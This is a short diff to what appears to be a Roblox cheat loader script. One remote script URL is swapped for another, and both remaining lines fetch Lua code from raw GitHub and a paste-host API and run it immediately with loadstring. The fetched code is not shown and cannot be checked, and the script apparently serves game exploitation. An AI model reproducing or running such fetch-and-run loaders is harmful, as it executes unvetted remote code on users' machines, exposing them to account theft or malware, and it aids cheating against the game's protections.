@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaScriptzHub/KitsuneV1-Predictor/refs/heads/main/ScriptManual"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/oxIxckVvn4UIW3bU/raw", true))()
